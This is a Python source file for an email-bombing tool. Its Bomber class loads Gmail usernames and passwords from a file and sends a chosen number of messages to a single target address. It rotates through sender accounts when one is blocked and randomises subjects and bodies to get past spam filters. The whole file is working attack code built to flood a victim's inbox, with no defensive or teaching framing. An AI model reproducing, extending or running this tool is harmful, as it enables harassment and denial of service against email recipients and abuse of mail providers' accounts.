import sys
import time
from random import randint
import smtplib

from essential_generators import DocumentGenerator

##ACCOUNTS.TXT FILE MUST CONTAIN GMAIL ACCOUNTS THAT HAVE NFA AND ACCESS TO LESS SECURE APPS ENABLED

class Bomber:
    '''This is the bomber class that contains email-bombing functions and methods'''

    gen = DocumentGenerator()

    def __init__(self, argv):
        self.receiving_email = argv[0]
        self.max_num_emails = int(argv[1])
        self.account_ind = 0
        if len(argv) == 4:
            self.subject, self.body, self.auto_gen = argv[2], argv[3], False
        else:
            self.auto_gen = True
        print("[INFO] auto-generate subject and body text is set to {}".format((str(self.auto_gen).upper())))
        if self.auto_gen == False:
            self.random_appendage = Bomber.prompt('''[PROMPT] Press (1) to append a random word at the end of the subject of each message, or press (2) to decline this. The former is suggested: ''')
        with open("bomber/accounts.txt", "r") as infile:
            data = [line.rstrip().split(":") for line in infile]
            self.sending_email, self.sending_passwd = zip(*data)


    def start(self):
        send_algo = Bomber.prompt('''[PROMPT] Press (1) for randomized sending, or press (2) for linear sending. The former is suggested: ''')
        Bomber.random_sending(self) if send_algo == 1 else Bomber.linear_sending(self)


    def random_sending(self):
        for i in range(self.max_num_emails):
            rand_ind = randint(1, len(self.sending_email)) - 1
            if isinstance(Bomber.send(self, self.sending_email[rand_ind], self.sending_passwd[rand_ind]), int):
                print("\nBlocked {}".format(self.sending_email[rand_ind])) #debug
            print("[{}/{}] total emails have been sent. The current email is {}".format(i + 1, self.max_num_emails, self.sending_email[self.account_ind]), end = '\r')
        print("\nDONE !!!")

    #sequentially iterates over the accounts.txt and swtiches only when SMTP connection gets closed
    def linear_sending(self):
        for i in range(self.max_num_emails):
            if isinstance(Bomber.send(self, self.sending_email[self.account_ind], self.sending_passwd[self.account_ind]), int):
                if self.account_ind != len(self.sending_email) - 1:
                    self.account_ind += 1
                else:
                    self.account_ind = 0
            print("[{}/{}] total emails have been sent. The current email is {}".format(i + 1, self.max_num_emails, self.sending_email[self.account_ind]), end = '\r')
        print("\nDONE !!!")

    def send(self, sending_email, sending_passwd):
        gen = Bomber.gen
        if self.auto_gen:
            full_subject = gen.sentence()
            full_body = gen.paragraph()
        elif self.random_appendage == 1:
            full_subject = self.subject + " {}".format(gen.word())
            full_body = self.body
        else:
            full_subject = self.subject
            full_body = self.body
        msg = ('Subject: {}\n\n{}'.format(full_subject, full_body)).encode(encoding='UTF-8', errors ='strict')
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(sending_email, sending_passwd)
            server.sendmail(sending_email, self.receiving_email, msg)
        except KeyboardInterrupt:
            print("\n[-] ctrl+C was pressed. quitting...")
            sys.exit()
        except smtplib.SMTPSenderRefused:
            return 1
        except smtplib.SMTPDataError:
            return 2
        except smtplib.SMTPAuthenticationError:
            return 3
        except smtplib.SMTPServerDisconnected:
            return 4

    def prompt(str):
        while True:
            try:
                response = int(input(str))
                if response not in [1, 2]:
                    raise ValueError
                else:
                    break
            except ValueError:
                print("Invalid Input. Enter (1) or (2)")
            except KeyboardInterrupt:
                print("\n[-] ctrl+C was pressed. quitting...")
                sys.exit()
        return response

if __name__ == '__main__':
    print("This file is not to be run directly.")
    sys.exit()
